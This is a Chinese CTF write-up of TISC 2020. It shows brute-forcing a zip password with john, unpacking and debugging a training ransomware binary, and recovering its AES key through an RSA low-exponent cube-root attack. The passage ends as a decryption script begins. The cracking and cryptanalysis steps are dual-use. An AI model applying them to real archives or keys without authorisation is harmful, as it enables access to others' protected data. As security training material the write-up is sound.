> 原文链接: https://www.anquanke.com//post/id/218551 


# TISC 2020 CTF 题目分析及writeups


                                阅读量   
                                **669324**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p3.ssl.qhimg.com/t01974a515d1b764a0d.png)](https://p3.ssl.qhimg.com/t01974a515d1b764a0d.png)



## 简介

TISC(The InfoSecurity Challenge) 2020 CTF 一共包含6道题目，主要涉及密码学、二进制、逆向等知识点，部分题目之间具备一定的连续性，下面对题目进行具体分析。



## STAGE 1：What is this thing?

连接服务后，指向一个zip文件连接。

```
$$$$$$$$\ $$$$$$\  $$$$$$\   $$$$$$\
\__$$  __|\_$$  _|$$  __$$\ $$  __$$\
   $$ |     $$ |  $$ /  \__|$$ /  \__|
   $$ |     $$ |  \$$$$$$\  $$ |
   $$ |     $$ |   \____$$\ $$ |
   $$ |     $$ |  $$\   $$ |$$ |  $$\
   $$ |   $$$$$$\ \$$$$$$  |\$$$$$$  |
   \__|   \______| \______/  \______/

CSIT's The Infosecurity Challenge 2020
https://play.tisc.csit-events.sg/

CHALLENGE 1: What is this thing?
======================================

SUBMISSION_TOKEN? LdWaGOgyfbVQromGEgmzfADJYNpGEPKLUgjiudRJfMoKzpXyklQgNqSxSQeNYGsr

We noticed unusually network activity around the time that the user reported being ransomware-d.
There were files being sent and recieved, some of which we were unable to inspect.
Could you try to decode this?

Reminder! SAVE ANY CODE YOU WROTE / TAKE SCREENSHOTS OF YOUR WORK, THIS WILL NEED TO BE SUBMITTED IN YOUR WRITEUP!
CLARITY OF DOCUMENTATION WILL CONTRIBUTE TO A BETTER EVALUATION OF YOUR WRITEUP.

The file is hosted at http://fqybysahpvift1nqtwywevlr7n50zdzp.ctf.sg:31080/325528f1f0a95ebbcdd78180e35e2699.zip .


Flag?
```

该zip文件受到密码保护，里面包含一个名为`temp.mess`的文件：

```
r10@kali:~/tisc$ unzip d9c8f641bd3cb1b7a9652e8d120ed9a8.zip
Archive:  d9c8f641bd3cb1b7a9652e8d120ed9a8.zip
[d9c8f641bd3cb1b7a9652e8d120ed9a8.zip] temp.mess password:
```

根据题目的介绍`they are using a simple password (6 characters, hexadecimal) on the zip files`，可知解压密码为6位十六进制，采用暴力破解的方式就可以得到。在破解之前，先将zip文件转换为爆破工具john接受的格式，然后开始爆破：

```
r10@kali:~/tisc$ zip2john d9c8f641bd3cb1b7a9652e8d120ed9a8.zip  &gt; zip.hashes
ver 2.0 d9c8f641bd3cb1b7a9652e8d120ed9a8.zip/temp.mess PKZIP Encr: cmplen=125108, decmplen=125056, crc=16B94B68

r10@kali:~/tisc$ john --min-len=6 --max-len=6 --mask='?h?h?h?h?h?h' ./zip.hashes
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
eff650           (d9c8f641bd3cb1b7a9652e8d120ed9a8.zip/temp.mess)
1g 0:00:00:00 DONE (2020-09-17 11:18) 25.00g/s 9011Kp/s 9011Kc/s 9011KC/s 000650..fff750
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

得到解压密码为`eff650`。使用该密码解压，得到bzip2压缩格式的`temp.mess`文件：

```
r10@kali:~/tisc$ unzip d9c8f641bd3cb1b7a9652e8d120ed9a8.zip
Archive:  d9c8f641bd3cb1b7a9652e8d120ed9a8.zip
[d9c8f641bd3cb1b7a9652e8d120ed9a8.zip] temp.mess password:
  inflating: temp.mess

r10@kali:~/tisc$ file temp.mess
temp.mess: bzip2 compressed data, block size = 900k
```

经过几个阶段的手动提取，对文件进行分析，该文件是一个包含不同格式及编码嵌套的文件，主要包括`bzip2 compressed` `hex encoding` `base64 encoding` `xz compressed` `gzip compressed` `zlib compressed`。依据这个思路，编写解压脚本：

```
import shutil
import magic
import os
import base64
import zlib
import hashlib
import json

def unpack(filename):
    try:
        typed = magic.from_file(filename)
    except Exception:
        # Problem with python2 magic
        typed = "zlib"

    if 'BS image' in typed:
        typed = 'zlib'

    new_filename = "unknown"
    out_file = "unknown"

    if "bzip2" in typed:
        new_filename = '`{``}`b.bz2'.format(filename)
        shutil.copy(filename, new_filename)
        os.system("bzip2 -d `{``}`".format(new_filename))
        out_file = '`{``}`b'.format(filename)
    elif "ASCII text" in typed:
        data = open(filename, 'rb').read()
        if data.lower() == data:
            new_filename = '`{``}`h'.format(filename)
            open(new_filename, 'wb').write(bytes.fromhex(data.decode("ascii")))
            out_file = new_filename
        else:
            new_filename = '`{``}`f'.format(filename)
            open(new_filename, 'wb').write(base64.b64decode(data))
            out_file = new_filename
    elif "XZ compressed" in typed:
        new_filename = '`{``}`x.xz'.format(filename)
        shutil.copy(filename, new_filename)
        os.system("xz -d `{``}`".format(new_filename))
        out_file = '`{``}`x'.format(filename)
    elif "gzip" in typed:
        new_filename = '`{``}`g.gz'.format(filename)
        shutil.copy(filename, new_filename)
        os.system("gzip -d `{``}`".format(new_filename))
        out_file = '`{``}`g'.format(filename)
    elif "zlib" in typed:
        data = open(filename, 'rb').read()
        new_filename = '`{``}`z'.format(filename)
        out_file = new_filename
        open(out_file, 'wb').write(zlib.decompress(data))
    elif 'JSON' in typed:
        data = open(filename, 'rb').read()
        print("Flag!")
        print(json.loads(data))

    return out_file


def main():
    current = 'temp.mess_'
    os.system("rm temp.mess_*")
    shutil.copy('temp.mess', 'temp.mess_')
    for i in range(200):
        next_file = unpack(current)
        #print('`{``}` -&gt; `{``}`'.format(current, next_file))
        current = next_file
        if current == 'unknown':
            return


if __name__ == '__main__':
    main()
```

执行解压脚本得到flag：

```
r10@kali:~/tisc$ python solver.py
rm: temp.mess_*: No such file or directory
Flag!
`{`'anoroc': 'v1.320', 'secret': 'TISC20`{`q1_d06fd09ff9a27ec499df9caf42923bce`}`', 'desc': 'Submit this.secret to the TISC grader to complete challenge', 'constants': [1116352408, 1899447441, 3049323471, 3921009573, 961987163, 1508970993, 2453635748, 2870763221], 'sign': 'cx-1FpeoEgqkk2HN70RCmRU'`}`
```

**Flag:** `TISC20`{`q1_d06fd09ff9a27ec499df9caf42923bce`}``



## STAGE 2：Find me some keys

通过题目介绍可知，需要寻找一个完整的base64编码的公共秘钥：

```
The key file will look something like this but longer:
LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0NCmMyOXRaU0JpWVhObE5qUWdjM1J5YVc1bklHZHZaWE1nYUdWeVpRPT0NCi0tLS0tRU5EIFBVQkxJQyBLRVktLS0tLQ==
```

这里提供了一个名为`encrypted.zip` 的文件，解压得到一些docker文件，并且被后缀`.anoroc`加密：

```
r10@kali:~/tisc$ unzip encrypted.zip
Archive:  encrypted.zip
   creating: dockerize/
  inflating: dockerize/Dockerfile
  inflating: dockerize/anorocware
   creating: dockerize/encrypted/
 extracting: dockerize/encrypted/secret_investments.db.anoroc
   creating: dockerize/encrypted/images/
  inflating: dockerize/encrypted/images/slopes.png.anoroc
  inflating: dockerize/encrypted/images/lake.jpg.anoroc
  inflating: dockerize/encrypted/images/ridge.png.anoroc
  inflating: dockerize/encrypted/images/rocks.jp2.anoroc
  inflating: dockerize/encrypted/images/rollinginthed33p.png.anoroc
  inflating: dockerize/encrypted/images/yummy.png.anoroc
   creating: dockerize/encrypted/email/
 extracting: dockerize/encrypted/email/aqec62y3.txt.anoroc
...
 extracting: dockerize/encrypted/email/_7zp3gmy.txt.anoroc
 extracting: dockerize/encrypted/keydetails-enc.txt
 extracting: dockerize/encrypted/clients.db.anoroc
  inflating: dockerize/encrypted/ransomnote-anoroc.txt
```

通过分析，二进制的勒索文件`anorocware`是一个重要线索，该文件格式为`64-bit ELF`：

```
r10@kali:~/tisc$ file anorocware
anorocware: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, stripped
```

查询该文件中包含是字符串，发现为UPX打包：

```
r10@kali:~/tisc$ strings -a anorocware | grep 'packed'
$Info: This file is packed with the UPX executable packer http://upx.sf.net $
```

利用`ups`工具解压：

```
r10@kali:~/tisc$ upx -d anorocware
                       Ultimate Packer for eXecutables
                          Copyright (C) 1996 - 2017
UPX 3.94        Markus Oberhumer, Laszlo Molnar &amp; John Reiser   May 12th 2017

        File size         Ratio      Format      Name
   --------------------   ------   -----------   -----------
   7406375 &lt;-   3993332   53.92%   linux/amd64   anorocware

Unpacked 1 file.
```

解压出的文件是用go编译的二进制文件，我们可以放入`Ghidra` 或者`Binary Ninja`中进行分析。为了寻找base64编码的公钥，可以定位到文件中解码base64字符串的位置。数据通过`main.EncryptDecrypt`函数，然后传递到`encoding/base64.(*Encoding).DecodeString`函数中：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t0131f3bdeff86230e7.jpg)

在`0x662175`处放置断点，寻找base64编码的字符串：

```
r10@kali:~/tisc$ gdb ./anorocware
GNU gdb (Ubuntu 8.1-0ubuntu3.2) 8.1.0.20180409-git
Copyright (C) 2018 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
...

gef&gt;  br *0x662175
Breakpoint 1 at 0x662175: file /home/hjf98/Documents/CSPC2020Dev/goware/main.go, line 246.
```

调试运行后，检查堆栈中的值，找到匹配的字符串：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t019d96a28153c68c3f.jpg)

```
gef&gt;  x/s $rcx
0xc000435000:    "LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJRUlEQU5CZ2txaGtpRzl3MEJBUUVG
QUFPQ0JBMEFNSUlFQ0FLQ0JBRUFtOTliMnB2dHJWaVcrak4vM05GZgp3OGczNmRRUjZpSnIrY3lSZStrOFhGe
nVIVU80TE4zdGs3NnRGUzhEYmFDY1lGaXVmOEdzdWdjUm1RREVyUFpmCnFna3ZYWnB1ZmZmVGZqVEIramUvV2
k0M2J3THF0dzBXNGNYb1BXMzN1R1ZhV1pYMG9MektDL0F4Zzdrd0l0bUcKeG5uMzIxVEFqRVpnVGJMK09hTmt
jSHpmUTdVendhRXA5VVB0VDhwR1lvTkpIbFgzZmtGcTJpVnk3N3VJNGdSSwpNZjh1alRma0lISGpRN0JFemdF
Z2s4a3F4R2FTUGxJTlFzNjVQNHR2T3BpaHFwd1VWcEFqUExOQlR0OUh6MUYvCmZSK2FEc0pRUktaTk1yV1JMd
U1ZaU8yTXg5Y1pCbnd6TDlLdUZSdkhlbE83QldheVU5ZjBYT3BnL3p5YkVRT0wKdXgram1zVXNUc1Fiaks5Y0
I2N01hMjFEK1hKSHlLZ0t1UDl1MTRtVkNaZ0NCazlseWJTMWJ4ZHZGRFFQZ2t5YwpNM3o5dnV1Y0NVMUV1MkQ
wbGhGbUozRlFmWmtBWSsrWEhVcGl3dWk5Tk8zQTlVRzdhbXlYYk9TY2xGMlg5a1JxCjBDd21xT3RCUkJFV0lT
ZTVyZHpjL0FUT1AzUHFEakd3eVNYeFdaRENIOHJyZ256V3B2MkxyaVlRVG5mMmNFMEcKL2lJOFJ3allvR0xXe
mVMVlJyMWhoWjhZNXM0Ui9zUjQ5N1dlbmtSY3BPTE9rRFZnZTdNdXNUT1doNGVOaTRnbwpQbGRzaVlUcVRuZE
Exd1Y2N3IwOXVqcHA4VnZwZEx1bys0aCs3cC9wZnBYTXN4OGRBTG9tNHNma1ljSkhoT2JrCnh0NUNwTkNrVlh
oNXRzR2hlRmI3djg1R2lORnkxN3p1YWxNZGEzMkJpblBlRWJGcnFLd0QyWjRSNVFnUXVCOHUKSXdqcVNUZ05v
OVV2dmNoNmxXQ2JqOWUrODB1Z1Y0bzdqSENkLzU2Rmt1dmhDcWlJTmRaRFVVNFpCMzdoZGVsZgplRTlOYnhEa
ktHOFY3YUNkd3FKSkRZR2l6LzNqbXVDZkIvazVGa29IU0FOZ2JMRTBBNVNtazNUOHR1djhTeitmCnY0cnJQeG
1wbjhYMlNtMUZveitVMEJXelArVkxtcExubnlYa3JPSHluOGxKRmJuL1U1TldHUkxuK2V2MkNTa3cKQUkvVGZ
IQUxxVHZqcWxHUXhUVGFZN1pua241aStEMUx6dEs4Y3BTWlhkRFZvUmgrL3ZNSUVpTnVrOCsrL3M2YQpITmQ3
d3VGa1kvWjhqakoxakgvY3NGMzdtR1lBVXhwMzJuUms1d1JwL2M2ZVdaUE0rekdpYmZFbm1GVzV5VUVVClliW
DRoenpHcjVRNmYvc3lzdXpoYXlsV2kzWEN2SXJINkxCakZOdTNVSjBWSXpjSk4wa3hhQUJhWFk4SlVEWVgKdF
hVTGlwdlVPcWt0dE9xSlN4T1hXZzcyU1dLTEt2L1F2ZkRSVlhlZFVrMDY2azdSTDFva3BiTW53WWxmWWc3Sgp
tcFpaUjJDTk53Yk1rUW0yVG1yQS9NWnVkdnF0c1g5UHBrZ0pJK1pXalV3VnRHUlVUZERNeFpXeDRIM25lSml5
CjhtOHVkazQyUk4wajNuMHdWWHNXdDZRbXk3YlFzSFlYSUhVZ2tCWFl6ZHkvdStOb2RLQWpoZFZwaUpiekluY
3oKU2RvbFhpbmlLd05VTFc4VmpqUzlLVFNSd2lkcWVPa2twTmVJcWlSbldUM1RUTUFNemI1ajBqRUdGN0wzRE
9NUAo2UUlCQXc9PQotLS0tLUVORCBQVUJMSUMgS0VZLS0tLS0K"
```

对该字符串解码，得到公钥，然后用SHA256进行哈希散列得到flag：

```
r10@kali:~/tisc$ public_key | base64 -d
-----BEGIN PUBLIC KEY-----
MIIEIDANBgkqhkiG9w0BAQEFAAOCBA0AMIIECAKCBAEAm99b2pvtrViW+jN/3NFf
w8g36dQR6iJr+cyRe+k8XFzuHUO4LN3tk76tFS8DbaCcYFiuf8GsugcRmQDErPZf
qgkvXZpufffTfjTB+je/Wi43bwLqtw0W4cXoPW33uGVaWZX0oLzKC/Axg7kwItmG
xnn321TAjEZgTbL+OaNkcHzfQ7UzwaEp9UPtT8pGYoNJHlX3fkFq2iVy77uI4gRK
Mf8ujTfkIHHjQ7BEzgEgk8kqxGaSPlINQs65P4tvOpihqpwUVpAjPLNBTt9Hz1F/
fR+aDsJQRKZNMrWRLuMYiO2Mx9cZBnwzL9KuFRvHelO7BWayU9f0XOpg/zybEQOL
ux+jmsUsTsQbjK9cB67Ma21D+XJHyKgKuP9u14mVCZgCBk9lybS1bxdvFDQPgkyc
M3z9vuucCU1Eu2D0lhFmJ3FQfZkAY++XHUpiwui9NO3A9UG7amyXbOSclF2X9kRq
0CwmqOtBRBEWISe5rdzc/ATOP3PqDjGwySXxWZDCH8rrgnzWpv2LriYQTnf2cE0G
/iI8RwjYoGLWzeLVRr1hhZ8Y5s4R/sR497WenkRcpOLOkDVge7MusTOWh4eNi4go
PldsiYTqTndA1wV67r09ujpp8VvpdLuo+4h+7p/pfpXMsx8dALom4sfkYcJHhObk
xt5CpNCkVXh5tsGheFb7v85GiNFy17zualMda32BinPeEbFrqKwD2Z4R5QgQuB8u
IwjqSTgNo9Uvvch6lWCbj9e+80ugV4o7jHCd/56FkuvhCqiINdZDUU4ZB37hdelf
eE9NbxDjKG8V7aCdwqJJDYGiz/3jmuCfB/k5FkoHSANgbLE0A5Smk3T8tuv8Sz+f
v4rrPxmpn8X2Sm1Foz+U0BWzP+VLmpLnnyXkrOHyn8lJFbn/U5NWGRLn+ev2CSkw
AI/TfHALqTvjqlGQxTTaY7Znkn5i+D1LztK8cpSZXdDVoRh+/vMIEiNuk8++/s6a
HNd7wuFkY/Z8jjJ1jH/csF37mGYAUxp32nRk5wRp/c6eWZPM+zGibfEnmFW5yUEU
YbX4hzzGr5Q6f/sysuzhaylWi3XCvIrH6LBjFNu3UJ0VIzcJN0kxaABaXY8JUDYX
tXULipvUOqkttOqJSxOXWg72SWKLKv/QvfDRVXedUk066k7RL1okpbMnwYlfYg7J
mpZZR2CNNwbMkQm2TmrA/MZudvqtsX9PpkgJI+ZWjUwVtGRUTdDMxZWx4H3neJiy
8m8udk42RN0j3n0wVXsWt6Qmy7bQsHYXIHUgkBXYzdy/u+NodKAjhdVpiJbzIncz
SdolXiniKwNULW8VjjS9KTSRwidqeOkkpNeIqiRnWT3TTMAMzb5j0jEGF7L3DOMP
6QIBAw==
-----END PUBLIC KEY-----

r10@kali:~/tisc$ printf "TISC20`{`%s`}`" $(public_key | shasum -a 256 | cut -d' ' -f 1)
TISC20`{`8eaf2d08d5715eec34be9ac4bf612e418e64da133ce8caba72b90faacd43ceee`}`
```

**Flag:** `TISC20`{`8eaf2d08d5715eec34be9ac4bf612e418e64da133ce8caba72b90faacd43ceee`}``



## STAGE 3: Recover some files

这一关需要对Stage 2提供的`encrypted.zip`文件中被加密的文件进行解密。为了达到这个目的，我们需要了解勒索文件`anorocware`的内部运行流程。对`main.mian`进行检查，可以发现赎金条(ransom note)被写入`ransomnote-anoroc.txt`文件中:

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01529cc0f9d7a9be34.jpg)

赎金条包含一个先前计算的`machineid.ID()`:

```
$$$$$$$$\ $$$$$$\  $$$$$$\   $$$$$$\
\__$$  __|\_$$  _|$$  __$$\ $$  __$$\
   $$ |     $$ |  $$ /  \__|$$ /  \__|
   $$ |     $$ |  \$$$$$$\  $$ |
   $$ |     $$ |   \____$$\ $$ |
   $$ |     $$ |  $$\   $$ |$$ |  $$\
   $$ |   $$$$$$\ \$$$$$$  |\$$$$$$  |
   \__|   \______| \______/  \______/

Hello Sir / Madam,

Your computer has been hax0red and your files are now to belong to me.
We use military grade cryptography code to encrypt ur filez.
Do not try anything stupid, u will lose ur beloved data.

You have 48 hours to pay 1 Ethereum (ETH) to 0xc184e8BB0c8AA7326056D21C4Badf3eE58f04af2.
Email divoc-91@protonmail.ch proof of your transaction to obtain your decryption keys.
PLEASE INCLUDE YOUR MACHINE-ID = 6d8da77f503c9a5560073c13122a903b IN YOUR EMAIL

Your move,
Anor0cW4re Team

+++++ +++++ +++++ +++++ +++++ +++++

DO NOT BE ALARMED;
DO NOT SEND ETHEREUM TO ANY ACCOUNT;
THIS IS AN EDUCATIONAL RANSOMWARE
FOR CYBER SECURITY TRAINING;

+++++ +++++ +++++ +++++ +++++ +++++
```

然后,URL`https://ifconfig.co/json`获取受害者网络的信息，填充了`city`和`ip`参数：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t016172b78fdb4f4d76.jpg)

然后，生成两个随机数，分别代表`encryption key``encryption IV`：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01599f7bc461d90f89.jpg)

然后，构造JOSN结构数据，包含字段`City``EncIV``EncKey``IP``MachineId`:

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01bcd4794a656505f8.jpg)

随后，对公钥进行解密、编码、解析：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t010869fcc84edde2d5.jpg)

接着，对JOSN字段进行URL编码：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t0136dada696e74d144.jpg)

处理后JOSN数据被转换为一个大数并求幂，可以理解为进行RSA操作：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01cde221e16158ad4a.jpg)

随后，所有的数据将被写入`keydetails-enc.txt`文件中：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01eb2c76da73c248fa.jpg)

与此同时，域名生成算法`main.QbznvaAnzrTrarengvbaNytbevguz`执行，生成C2域名，并发送报告：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t015bfa77bdbab3fb21.jpg)

最后，通过`main.visit.func1`函数遍历整个目录，完成所有文件加密：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01135fe271c71f0fe1.jpg)

接下来，分析`main.visit.func1`函数，使用`EncKey`对AES-128密码进行初始化来对文件加密：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t016582f32ac08d71a3.jpg)

通过分析发现，IV并不是一个常量，而是将IV的前两个字节设置为文件名的前两个字节：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t0108dc10698038d2db.jpg)

密码设置为CTR模式，加密数据输出到`.anoroc`后缀的文件中：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t010fb36002b9128575.jpg)

分析完毕了整个加密逻辑，为了进行文件解密，首先需要检查公钥：

```
r10@kali:~/tisc$ openssl rsa -noout -text -inform PEM -in ./pub_key -pubin
Public-Key: (8192 bit)
Modulus:
    00:9b:df:5b:da:9b:ed:ad:58:96:fa:33:7f:dc:d1:
    5f:c3:c8:37:e9:d4:11:ea:22:6b:f9:cc:91:7b:e9:
    3c:5c:5c:ee:1d:43:b8:2c:dd:ed:93:be:ad:15:2f:
    03:6d:a0:9c:60:58:ae:7f:c1:ac:ba:07:11:99:00:
    c4:ac:f6:5f:aa:09:2f:5d:9a:6e:7d:f7:d3:7e:34:
...
    bf:bb:e3:68:74:a0:23:85:d5:69:88:96:f3:22:77:
    33:49:da:25:5e:29:e2:2b:03:54:2d:6f:15:8e:34:
    bd:29:34:91:c2:27:6a:78:e9:24:a4:d7:88:aa:24:
    67:59:3d:d3:4c:c0:0c:cd:be:63:d2:31:06:17:b2:
    f7:0c:e3:0f:e9
Exponent: 3 (0x3)
```

这里指数为3，可以采用[cube-root attack](https://crypto.stackexchange.com/questions/33561/cube-root-attack-rsa-with-low-exponent)思路。首先，将密文转换为十六进制：

```
import binascii
data = open("./dockerize/encrypted/keydetails-enc.txt", "rb").read()
print("0x" + binascii.hexlify(data).decode("utf-8"))'

```

```
r10@kali:~/tisc$ python conv_hex.py
0x04aca8af91f97ef198ba32c820e8868deb693f86f763d3a2879a84fa8e7af6f396107701b480e453ec6
9b7e3f72f02520f408a98c163db6c70f9902eab87c882b73c158e16be95dc4a9921fec3297586343b250f
6cf58f3512e37de84e2f3d12639bec4f88ed5e68226fad6c2e5dbdfe9b44350aaedc61015e8f28cce50a6
9c67f919f0c5d2c2c9073bf4d25afb299e65acf703880949b32f5e442e77cf527f6a8a3881ba1f94e7910
3abb9c1a1f55a4735488e05d0a41fd7feb3b7c130c2139dcc4301a55d87806e04f45ce210ecbc971bfaf7
a2ff090f39709f4025f658f7729eb1cfbef40cfce7d469d1095f60144e2f312b6493ce0cca37651890894
25a04d035cdd6a80b131b231215141ae83f2a3410fc551ca30296be4ad3f7bf4cdb1e09583f97d445150c
037f88d7ca765174f8b202b6a5f513dd9f20b430bbbbfc2309293271faac024b38cde3fc22555cd860ef7
9ae16697982e37650c933ced29879280f2301d7efcc4967dd77e668a65afbc770d46669e67678f347c5d8
5ffe05218d8ebeec470ca1d74ae8956589db43999a1643a95b0a72acf6ace052fdef8bcc63dc7ce670248
66d4e7cb421965218614a41e0789c7239733e6f97c00f1db05bff3e1283e3790a4a9ac2e6f1cfa5084555
f4412da28d7434bfa27d6b4cdf4da50889c9285c8ca0e606398bfb3b34894752667df01a28023b7297d3a
16978f4a974cf2d04088
```

接着可以用Sage计算立方根：

```
from sage.crypto.util import bin_to_ascii, ascii_to_bin

c = 0x04aca8af91f97ef198ba32c820e8868deb693f86f763d3a2879a84fa8e7af6f396107701b480e45
3ec69b7e3f72f02520f408a98c163db6c70f9902eab87c882b73c158e16be95dc4a9921fec3297586343b
250f6cf58f3512e37de84e2f3d12639bec4f88ed5e68226fad6c2e5dbdfe9b44350aaedc61015e8f28cce
50a69c67f919f0c5d2c2c9073bf4d25afb299e65acf703880949b32f5e442e77cf527f6a8a3881ba1f94e
79103abb9c1a1f55a4735488e05d0a41fd7feb3b7c130c2139dcc4301a55d87806e04f45ce210ecbc971b
faf7a2ff090f39709f4025f658f7729eb1cfbef40cfce7d469d1095f60144e2f312b6493ce0cca3765189
089425a04d035cdd6a80b131b231215141ae83f2a3410fc551ca30296be4ad3f7bf4cdb1e09583f97d445
150c037f88d7ca765174f8b202b6a5f513dd9f20b430bbbbfc2309293271faac024b38cde3fc22555cd86
0ef79ae16697982e37650c933ced29879280f2301d7efcc4967dd77e668a65afbc770d46669e67678f347
c5d85ffe05218d8ebeec470ca1d74ae8956589db43999a1643a95b0a72acf6ace052fdef8bcc63dc7ce67
024866d4e7cb421965218614a41e0789c7239733e6f97c00f1db05bff3e1283e3790a4a9ac2e6f1cfa508
4555f4412da28d7434bfa27d6b4cdf4da50889c9285c8ca0e606398bfb3b34894752667df01a28023b729
7d3a16978f4a974cf2d04088
ci = Integer(c)
p = pow(ci, 1/3)
pa = p.ceil().binary()
print(bin_to_ascii("0" + pa))
```

得到`EncKey``EndIV`等字段的值：

```
City=Singapore&amp;EncIV=%1C%9F%A4%9B%2C%9EN%AF%04%9CA%AE%02%86%03%81&amp;EncKey=%99z%11%12%7FjD%22%93%D2%A8%EB%1D2u%04&amp;IP=112.199.210.119&amp;MachineId=6d8da77f503c9a5560073c13122a903b
```

编写`decrypt_anoroc.py`对文件进行解密：

```
from Crypto.Cipher import AES
from Crypto.Util import Counter
import sys
import os.path

IV = bytes.fromhex('1c9fa49b2c9e4eaf049c41ae02860381')
